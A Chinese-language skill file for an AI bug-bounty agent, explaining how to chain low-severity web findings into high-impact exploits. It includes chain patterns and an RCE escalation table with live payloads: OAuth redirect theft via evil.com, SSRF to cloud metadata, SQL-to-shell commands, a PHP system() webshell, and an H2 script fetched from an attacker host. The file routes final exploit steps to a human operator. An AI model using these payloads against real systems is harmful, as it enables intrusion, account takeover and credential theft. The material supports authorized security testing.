---
name: chain-findings
description: 把低 severity 发现升级为可报告漏洞——构造利用链（A→B→C）
---

# 链发现

> **规则引用（R12）：** NEVER SUBMIT 列表和 `chain_with[]` 要求活在 `.claude/rules/hunting.md` Rule 17。强制它们的 save-finding 门是 Rule 10b。R25（chain_with 校验器）拒链锚定死发现。本 skill 描述**思考**；规则编号是权威。

取单独不值报的 low/medium 发现，链成高影响 bug。

## SMART MOVE — 首调

```
1. findings = get_findings(domain, status='confirmed')
2. graph = build_findings_graph(domain)
3. chains = propose_chains(domain)
4. for chain in chains: assess_finding(chain_with=[ids], ...) → save_finding
5. format_finding_for_platform(id, platform='hackerone')
```

完整版：`smart-move-chain-low-findings.md`。

## 链构造流程

### Step 1：盘点可用原语

列每个发现、异常、观察——即便 "info" 级：

| 原语 | 例 |
|---|---|
| Open redirect | `/redirect?url=` 接外部 URL |
| Self-XSS | XSS 仅在自己 session / profile 触发 |
| 缺 CSRF | 状态变更端点无 CSRF token |
| Info disclosure | 内部 IP、堆栈跟踪、版本信息 |
| 有限 path traversal | 可读文件但读不到 /etc/passwd |
| Header 注入 | 可注 CRLF 但无明显影响 |
| CORS 配错 | 反射 origin 但无凭据 |
| Verbose errors | SQL / 堆栈错但无数据抽取 |
| Rate limit 绕过 | 可绕特定端点限速 |
| Token 泄露 | URL / referrer / JS 中 API key 或 session token |
| 子域接管 | 悬空 CNAME 但无直接用户影响 |

### Step 2：从升级表匹配链

| 低发现 | + 链以 | = 升级影响 | Severity |
|---|---|---|---|
| Open redirect | SSRF filter | 绕 SSRF allowlist → 内部访问 | HIGH |
| Open redirect | OAuth 流 | 经 redirect_uri 操纵盗 OAuth token | CRITICAL |
| Open redirect | 登录流 | 用可信域 URL 钓鱼 | MEDIUM |
| Self-XSS | CSRF | 经 CSRF 强受害者触发 XSS（login CSRF + self-XSS） | HIGH |
| Self-XSS | Clickjacking | 骗受害者粘 XSS payload | MEDIUM |
| CSRF（状态变更） | 提权端点 | role-change 上 CSRF = 账户接管 | HIGH |
| CSRF（状态变更） | 密码改（无旧密） | 密码改上 CSRF = ATO | CRITICAL |
| Info 泄露（内部 IP） | SSRF | 用泄露 IP 击内部服务 | HIGH |
| Info 泄露（API key） | API 访问 | 用泄露 key 未授权访问数据 | HIGH-CRITICAL |
| Info 泄露（堆栈跟踪） | 已知 CVE | 框架版本匹配可利用 CVE | HIGH |
| 有限 path traversal | 源码读 | 读 config 文件 → DB 凭据 | CRITICAL |
| 有限 path traversal | JWT secret 读 | 读 secret key → 伪造 JWT token | CRITICAL |
| Header 注入（CRLF） | Set-Cookie | 经注入 cookie 的 session fixation | HIGH |
| Header 注入（CRLF） | XSS | 经 response splitting 注脚本 | HIGH |
| CORS 配错 | 响应中 token | 跨源盗敏感数据 | HIGH |
| Verbose SQL 错 | SQLi 技术 | 用 error 信息造可用 UNION/blind payload | HIGH |
| Rate limit 绕过 | Brute force | 凭据填充 / OTP 绕过 | HIGH |
| URL 中 token | Referrer 泄露 | 经 Referer header 送 token 给第三方 | MEDIUM-HIGH |
| 子域接管 | Cookie scope | 盗 scope 到父域的 cookie | HIGH |
| Race condition | 金融 | 双花、重复奖励 / 信用 | HIGH-CRITICAL |

### Step 3：构造并测试链

每个潜在链：

1. **记录链假设：**
   ```
   Finding A: [描述] (severity: LOW)
   + Finding B: [描述] (severity: LOW)
   = Chain: [逐步利用流]
   Expected Impact: [攻击者达成什么]
   ```

2. **测每个环节：**
   - 用 `session_request` 或 `run_flow` 执行多步链
   - 每步必成链才有效
   - 记每步的精确请求和响应

3. **证端到端影响：**
   - 链必演示真实世界影响（数据盗窃、ATO、提权）
   - 显从初始进入到最终影响的完整流
   - 第 2 步"理论性"的链**非**有效链

### Step 4：验证链

```
对每个链环节：
1. 攻击者能否无用户交互触发步骤 1？（更好）
2. 步骤 1 输出是否直喂步骤 2 输入？
3. 最终影响是否可量化差于任何单独发现？
4. 全链能否可靠复现（>80% 成功率）？
```

全 YES → 作单发现存升级 severity：
```
save_target_intel(domain, "findings", {
  "endpoint": "chain: step1_endpoint → step2_endpoint",
  "vulnerability_type": "chain: finding_a_type + finding_b_type",
  "status": "confirmed",
  "severity": ESCALATED_SEVERITY,
  "chain": [
    {"step": 1, "finding": "finding_a_id", "description": "...", "request": {...}},
    {"step": 2, "finding": "finding_b_id", "description": "...", "request": {...}},
  ],
  "impact": "Full chain impact description",
  "evidence": {full request/response for each step},
  "poc_request": "run_flow steps for full reproduction"
})
```

## 常见链模式

### 模式 1：Redirect → Token 盗窃
```
1. 找 open redirect: GET /redirect?url=https://evil.com → 302
2. 插入 OAuth 流: /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
3. OAuth token 经链式 redirect 送攻击者服务器
Impact: 经 OAuth token 盗窃实现账户接管
```

### 模式 2：Info 泄露 → 定向利用
```
1. 堆栈跟踪显: Spring Boot 2.3.1（或任何版本化技术）
2. 查该版本 CVE 数据库
3. 用版本特定 payload 利用已知 CVE
Impact: 经已知漏洞实现 RCE 或数据泄露
```

### 模式 3：Self-XSS → CSRF → Stored XSS
```
1. profile bio 字段的 Self-XSS（仅对自己触发）
2. profile 更新 CSRF（无 token）
3. 造页自动提交 CSRF → 在受害者 bio 设 XSS payload
4. 任何人看受害者 profile 时 XSS 触发
Impact: 经 CSRF 影响全用户的 Stored XSS
```

### 模式 4：IDOR + Info 泄露 → Mass 数据盗窃
```
1. /api/users/{id} 上 IDOR 返用户 profile（低：仅 name/email）
2. 枚举 ID（顺序或可预测）
3. 合并另一接受 user ID 取更多数据的端点
Impact: Mass PII 抽取
```

### 模式 5：Race Condition → 金融
```
1. coupon/reward 端点 rate limit 绕过
2. coupon 兑换 race condition（无原子检查）
3. 发 20 并行请求 → coupon 应用 5x
Impact: 金融损失、无限折扣
```

### 模式 6：OAuth redirect_uri → ATO
```
1. /redirect?url= 接外部 URL（open redirect）
2. 建 OAuth 流: /authorize?redirect_uri=https://target/redirect?url=https://evil
3. 受害者点 SSO → 授权码落攻击者
Impact: 经 OAuth token 盗窃的完全 ATO（按 Phase 4 下限 CRITICAL）
```

### 模式 7：Password Reset 邮箱改 Race
```
1. 为受害者邮箱启 password reset → 发 reset token
2. Race: reset 完成前 PATCH /account/email {"email":"attacker"}
3. reset 邮箱送新（攻击者）地址；攻击者完成 reset
Impact: 无受害者交互的 pre-auth ATO（CRITICAL）
```

### 模式 8：Webhook Replay + 签名剥离
```
1. 从日志或测试端点取已签 webhook（Stripe / GitHub / Slack）
2. 剥签名 header；重放到目标 webhook 处理器
3. 后端处理事件（供资源、退钱、以 bot 发帖）
Impact: Action-as-third-party（按动作 HIGH-CRITICAL）
```

### 模式 9：Mass Assignment → Role → ATO
```
1. POST /signup 加额外字段 {"role":"admin"} 或 {"is_verified":true}
2. 登录 → 经 compare_auth_states 确认提权
3. 用 admin 端点读全用户数据 / 重置任意密码
Impact: Pre-auth admin ATO（CRITICAL）
```

### 模式 10：Mobile Deep-Link → 后端 SSRF
```
1. App 注册 myapp://webview?url=... 并把 `url` 转后端图片取
2. 后端无验证取 → SSRF 到云 metadata
3. 盗 AWS 实例角色凭据
Impact: 经 deep-link payload 的云账户接管（CRITICAL）
```

### 模式 11：GPay/Apple Pay Token Replay + 订单换
```
1. 在攻击者订单 tokenize 便宜 $1 支付 token
2. POST /checkout/charge 用攻击者 token + 受害者 order_id + amount=$1000
3. 服务端不绑 token-to-order；收 $1、标 $1000 订单已付
Impact: $1 买 $1000 商品（CRITICAL——money_flow 下限）
```

### 模式 12：子域接管 → Cookie 盗窃
```
1. 识别 app-old.target.tld 上悬空 CNAME（删了的 Heroku/Vercel/S3 站）
2. 认领悬空资源；从 app-old.target.tld 服务内容
3. scope 到 .target.tld 的 cookie 现达攻击者；或在父域上下文跑 XSS
Impact: 全 .target.tld 用户的 session 盗窃（HIGH-CRITICAL）
```

### 模式 13：2FA Recovery → Passkey 删 → Reset → ATO
```
1. "Forgot 2FA"；recovery code 端点限速弱
2. 经 concurrent_requests 暴破 6 位 code；获部分 session
3. DELETE /webauthn/credentials/<id> 无 re-auth 即成功——移受害者 passkey
4. password reset → 攻击者邮箱（弱邮箱改流）
Impact: 绕 2FA + passkey 的完全 ATO（CRITICAL）
```

### 模式 14：Cache Poisoning → Stored XSS
```
1. 识别 cache-key-unaware header: X-Forwarded-Host 注入 Location/body
2. 经该 header 注 <script> payload；响应含之
3. CDN 缓存中毒响应；每个后续用户看 XSS
Impact: 无持久化向量的全用户 Stored XSS（HIGH-CRITICAL）
```

### 模式 15：SSRF → Cloud Metadata → 横移
```
1. /api/image-proxy?url= 上 SSRF（whitelist 但 redirect-follow）
2. 主攻击者站 302 到 http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. 服务端跟 redirect；取 IAM 凭据
4. 用凭据访问同账户 S3 / Lambda / RDS
Impact: 云账户陷落（CRITICAL）
```

## RCE 升级参考（检测表）

当入口类发现确认后，下列 pivot 可达 RCE。**此为计划表——勿自动执行升级步。** 检测探针活 `rce_detection.json`。真实利用由操作者监督（Copilot 模式）：映射链、用 `chain_with[]` 引 RCE pivot 存入口发现、发破坏性 payload 前问操作者。

| 入口漏洞 | Pivot 探针（检测） | 最终 RCE 步（操作者） | 门槛 |
|---|---|---|---|
| SQLi（MySQL） | `LOAD_FILE('/etc/hostname')` 返 string + `@@secure_file_priv` 空 | `INTO OUTFILE '<webroot>/shell.php'` | FILE priv + 可写 webroot |
| SQLi（PostgreSQL） | `rolsuper=true` OR `pg_execute_server_program` role | `COPY ... FROM PROGRAM 'cmd'` | 超级用户或 PG≥11 角色 |
| SQLi（MSSQL） | `IS_SRVROLEMEMBER('sysadmin')=1` | `EXEC xp_cmdshell 'cmd'`（关则经 sp_configure 重开） | sysadmin |
| SQLi（Oracle） | `EXECUTE on DBMS_SCHEDULER` count>0 | `dbms_scheduler.create_job` with executable | DBMS_SCHEDULER grant |
| SQLi（SQLite） | `sqlite_version()` 返版本 | `SELECT load_extension('/tmp/evil.so')` | load_extension 编译入 |
| SSRF | Gopher Redis `INFO` 返 `redis_version` | Gopher Redis `SET dir /var/spool/cron && SET file /etc/crontab && CONFIG REWRITE` | Redis 可达 + 可写 cron |
| SSRF | Memcached `stats` 返 STAT pid | Cache-key poisoning where app evals cached blob | App 读 cache 入 eval sink |
| SSRF | Elasticsearch `/_cluster/settings` 显 `script.allowed_types: inline` | Painless script with `Runtime.getRuntime().exec` | 动态脚本开 |
| SSRF | Jolokia `/list` 返 `Runtime` MBean | POST `/jolokia/exec/<MBean>/exec` | /exec 端点开 |
| Spring Boot Actuator | POST `/env` 返 200 + echo + `/restart` 返 405 | POST `eureka.client.serviceUrl` 攻击者 URL → `/refresh` → `/restart` | env 可写 + restart 接线 |
| Spring4Shell | `class.module.classLoader.resources=` 反射 / 400 with classLoader trace | classLoader.URLs[0] AccessLogValve → tomcatwar.jsp | Tomcat + 嵌套绑定 |
| Spring Cloud Function | header `routing-expression: T(System).currentTimeMillis()` → timing delta | `T(Runtime).getRuntime().exec(...)` | SCF ≤3.2.2 |
| Spring Cloud Gateway | POST `/actuator/gateway/routes` with `#{1+1}` 返 header `X-Probe: 2` | SpEL `T(Runtime).getRuntime().exec` in filter | actuator+gateway 暴露 |
| Confluence OGNL | URL path `${100+200}` 反射 `300` | `${@Runtime@getRuntime().exec("id")}` | CVE-2022-26134 / 2023-22515 未打补丁 |
| Apache OFBiz | `groovyProgram=throw new Exception(100+200)` 返 `Exception: 300` | `Runtime.getRuntime().exec` Groovy | OFBiz 补丁前 |
| ImageMagick upload | MVG with `label:swktest-MARKER` 反射在响应 | `msl:/dev/random` 或 shell 经 coder 绕过 | policy.xml 宽松 |
| libwebp upload | 服务端返 / 处理 WebP + 版本 ≤1.3.1 | 构造 Huffman table（CVE-2023-4863） | libwebp <1.3.2 |
| Ghostscript upload | tiny PostScript with title 处理；gs 版本暴露 | -dSAFER 绕过 / pipe-from-OutputFile | gs ≤9.27（或 10.x 补丁前） |
| ExifTool upload | DjVu chunk 解析（响应含 DjVu metadata） | CVE-2021-22204 Perl eval in DjVu ANT chunk | exiftool <12.24 |
| H2 console 暴露 | `/h2-console` 返 200 + 登录表单 | JDBC URL with `INIT=RUNSCRIPT FROM http://attacker/exec.sql` | h2-console 暴露（CVE-2021-42392） |
| WordPress admin ATO | `/wp-admin/theme-editor.php` 返 200 | 写 `<?php system($_GET['c']); ?>` 到 theme/header.php | admin + DISALLOW_FILE_EDIT=false |
| Joomla admin ATO | `/administrator?option=com_templates` 返编辑器 | PHP 写入模板 | admin 角色 |
| Drupal admin ATO | `/admin/modules` 列 "PHP filter" | Node with PHP input format | PHP filter 开（D7） |
| Mass-assignment → admin | `role=admin` 注册时被接受 | Admin 文件 / 模板编辑器写 | admin 端点可达 |
| OAuth ATO → admin | `redirect_uri` 绕 → admin session | Admin upload/template editor | 获 admin 角色 |
| Prototype pollution | `__proto__.X` 在后续响应反射 | Template engine gadget chain（EJS/pug/lodash） | 服务端 merge 入 prototype |
| File upload bypass → webshell | 扩展名 / MIME / 双扩展绕过确认 | 上传 .jsp/.aspx/.php with `<?php system($_GET['c']); ?>` | Upload 可达 + 可执行路径 |
| Deserialization | Class allowlist 缺（status=500 含 `ClassNotFoundException` on 良性 gadget） | ysoserial CommonsBeanutils / Log4Shell JNDI | 脆弱依赖在 |
| SSTI | `${100+200}` → 300 OR `{{7*7}}` → 49 | `T(Runtime).getRuntime().exec` / `__import__('os').system` | 引擎特定 RCE 类 |
| Command injection | `; sleep 5` 触发 timing delta | OS 命令经 shell 元字符 | Shell-exec sink |

**右列须操作者握手。** 当工具箱的 `assess_finding` 报入口类检测带此表已知 pivot，以 `vuln_type='potential_rce'` 存、附 pivot 作 finding-note、执行列 3 前提示操作者。自动利用 OFF。

## 链的 severity

链的 severity = **最高影响步的 severity**，非和。
Rule 14（勿虚报）仍适用。LOW + LOW = MEDIUM（链让单独不能的成立）可——但 LOW + LOW = CRITICAL 是过度声称、triager 会降。

链的 `business_context` 乘子跟**最终影响步**，非入口。引 `hunt.md` Phase 4 准则定档。

## 条件有效发现

这些发现**仅**带链时可报。**勿**单独提交：

| 发现 | 必需链 | 无链 |
|---|---|---|
| Self-XSS | + CSRF 或 clickjacking | 不可报 |
| Open redirect（无 token 盗窃） | + OAuth/SSRF/钓鱼 | 最多 LOW |
| 缺 rate limit（非认证） | + Brute force 场景 | 不可报 |
| Verbose errors | + 用此信息的可用利用 | 仅 INFO |
| CORS 无凭据 | + 响应中敏感数据 | 不可报 |
| Clickjacking（通用） | + 页上敏感动作 | 不可报 |
| 缺安全 headers | + 利用缺失的主动利用 | 仅 INFO |
| Cookie 无 Secure | + MitM 场景带真实影响 | 仅 INFO |
| Host header 注入 | + Cache poisoning 或 password reset | 不可单独报 |
| 非状态变更 CSRF | 必改服务端状态 | 不可报 |

## 永不链

- 勿链两个理论发现（"若 X 真 AND Y 真"）
- 勿链需你无的不同访问级别的发现
- 勿呈任一环节需受害者做不可能动作的链
- 勿跨完全不相关系统链发现
